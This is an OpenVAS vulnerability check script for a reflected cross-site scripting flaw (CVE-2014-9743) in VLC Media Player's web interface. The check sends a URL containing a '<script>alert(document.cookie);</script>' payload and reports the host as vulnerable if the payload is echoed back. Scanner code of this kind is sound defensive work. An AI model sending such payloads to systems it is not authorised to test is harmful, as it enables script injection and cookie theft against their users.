###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vlc_media_player_web_interface_xss_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# VideoLAN VLC Media Player Web Interface Cross-Site Scripting Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:videolan:vlc_media_player";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806027");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2014-9743");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-09-03 18:31:56 +0530 (Thu, 03 Sep 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("VideoLAN VLC Media Player Web Interface Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host has VideoLAN VLC Media Player
  and is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and
  check whether it is able read the cookie or not");

  script_tag(name:"insight", value:"The flaw is due to improper input
  sanitization of 'httpd_HtmlError' function in 'network/httpd.c' script in the
  VideoLAN VLC Media Player.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.");

  script_tag(name:"affected", value:"VideoLAN VLC Media Player versions before
  2.2.0.");

  script_tag(name:"solution", value:"Upgrade to VideoLAN VLC Media Player
  version 2.2.0 or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Mar/324");
  script_xref(name:"URL", value:"http://www.quantumleap.it/vlc-reflected-xss-vulnerability");

  script_tag(name:"solution_type", value:"VendorFix");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_vlc_media_player_remote_detect.nasl");
  script_mandatory_keys("VLC Media Player/Installed");
  script_require_ports("Services/www", 8080);
  script_xref(name:"URL", value:"http://www.videolan.org");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!vlcPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:vlcPort)){
  exit(0);
}

url = dir + "/te<script>alert(document.cookie);</script>st";

if(http_vuln_check(port:vlcPort, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document\.cookie\);</script>"))
{
  report = report_vuln_url(port:vlcPort, url:url);
  security_message(port:vlcPort, data:report);
  exit(0);
}
